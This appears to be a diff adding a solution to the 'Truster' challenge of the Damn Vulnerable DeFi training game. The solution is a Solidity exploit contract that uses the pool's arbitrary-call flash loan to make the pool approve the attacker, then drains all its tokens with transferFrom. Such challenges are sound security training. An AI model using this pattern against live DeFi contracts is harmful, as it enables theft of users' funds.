@@ -6,6 +6,28 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract ExploitTruster {
+    function exploit(
+        TrusterLenderPool pool,
+        DamnValuableToken token,
+        address recovery,
+        uint256 amount
+    ) external {
+        // Craft the call data to approve the transfer of tokens to the attacker contract
+        bytes memory callData = abi.encodeCall(
+            token.approve,
+            (address(this), amount)
+        );
+
+        // Flashloan for 0 tokens, just to call approve
+        pool.flashLoan(0, address(this), address(token), callData);
+
+        // Now transfer the tokens
+        token.transferFrom(address(pool), recovery, amount);
+
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -47,11 +69,16 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(player), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
+    /*
+        The exploit takes advantage of the fact that the TrusterLenderPool allows arbitrary calls
+         to be made during a flash loan.
      */
     function test_truster() public checkSolvedByPlayer {
         
+        //Call the exploit contract
+        ExploitTruster exploitContract = new ExploitTruster();
+        exploitContract.exploit(pool, token, recovery, TOKENS_IN_POOL);
+  
     }
 
     /**
